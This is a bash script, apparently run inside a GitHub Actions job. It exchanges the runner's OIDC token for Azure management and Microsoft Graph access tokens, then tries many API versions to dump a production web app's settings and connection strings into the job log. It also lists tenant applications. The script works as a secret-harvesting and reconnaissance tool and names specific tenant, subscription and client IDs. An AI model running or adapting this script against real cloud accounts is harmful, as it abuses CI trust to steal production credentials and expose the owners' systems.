#!/usr/bin/env bash
set +x
b64(){ base64 | tr -d '\n'; }
TENANT=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"; [ -z "$OIDC" ] && exit 0
AT=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "ARM_LEN=${#AT}"
B="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
for v in 2016-08-01 2018-11-01 2019-08-01 2020-06-01 2020-12-01 2021-02-01 2022-03-01 2023-01-01 2024-04-01; do
  echo "--- appsettings v$v: $(curl -s -H "Authorization: Bearer $AT" "$B/config/appsettings?api-version=$v" | head -c 400)"
done
echo "--- appsettings LIST (POST):"
curl -s -o /tmp/l1 -w "HTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "$B/config/appsettings/list?api-version=2022-03-01"; head -c 800 /tmp/l1; echo
echo "--- connectionstrings LIST (POST):"
curl -s -o /tmp/l2 -w "HTTP:%{http_code}\n" -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "$B/config/connectionstrings/list?api-version=2022-03-01"; head -c 600 /tmp/l2; echo
echo "--- GRAPH for deployer:"
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
echo "GRAPH_LEN=${#GT}"
curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId" | head -c 400; echo
echo "=== DONE ==="
